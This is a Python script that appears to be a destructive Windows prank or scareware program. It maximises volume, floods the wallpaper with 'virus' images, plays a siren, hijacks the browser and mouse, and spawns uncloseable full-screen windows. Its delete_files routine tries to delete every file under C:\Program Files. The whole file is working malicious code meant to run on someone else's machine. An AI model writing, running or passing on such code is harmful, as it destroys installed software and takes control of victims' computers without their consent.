# pip install: audioplayer, pycaw, comtypes, pyautogui, Selenium

# packages for def max_volume
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

# packages for def change_wallp
import ctypes
from random import choice

# packages for def delete_files
import os

# packages for def music
from audioplayer import AudioPlayer

# packages for def mouse
import pyautogui
from random import randint

# packages for def browser
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time

# packages for def tabs
from tkinter import *


def max_volume():
    # set max volume
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))

    volume.SetMasterVolumeLevel(0, None)


def change_wallp():
    virus_imgs = ['img/viruses1.jpg', 'img/viruses2.jpg']

    for i in range(20):
        ctypes.windll.user32.SystemParametersInfoA(20, 0, choice(virus_imgs), 0)


def delete_files():
    folder_path = r"C:\Program Files"

    for file_name in os.listdir(folder_path):
        file_path = os.path.join(folder_path, file_name)
        try:
            os.remove(file_path)
        except Exception as e:
            pass


def music():
    AudioPlayer(r"sound\fantasticheskaya-sirena-24553.mp3").play(block=True)


def mouse():
    for i in range(100):
        pyautogui.moveTo(randint(10, 3000), randint(10, 3000))
        pyautogui.click()


def browser():
    brows = webdriver.Chrome()

    brows.get('https://youtu.be/HfsiAtorewI?si=eJ2QY2ZRncHS65ey')
    html = brows.find_element(By.TAG_NAME, 'html')
    html.send_keys(Keys.ENTER)

    time.sleep(36000)


def multi():
    c = 10000
    for i in range(100):
        c = c*c
        print(c)


def Quit():
    pass


def tabs():
    root = Tk()
    root.title(
        "1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111")
    root.geometry("5000x5000")
    root.config(background='red')
    root.resizable(False, False)
    root.protocol("WM_DELETE_WINDOW", Quit)

    AudioPlayer(r"sound\fantasticheskaya-sirena-24553.mp3").play(block=True)
    btn1 = Button(root, text='close', font='Arial 20 bold')
    btn2 = Button(root, text='      CLOSE       ', font='Arial 20 bold')
    btn1.place(x=170, y=100)
    btn2.place(x=170, y=1000)

    root.mainloop()


def main():
    max_volume()
    change_wallp()
    music()
    for i in range(3):
        browser()

    mouse()
    multi()
    delete_files()

    for i in range(20):
        tabs()
        music()
        change_wallp()


if __name__ == '__main__':
    main()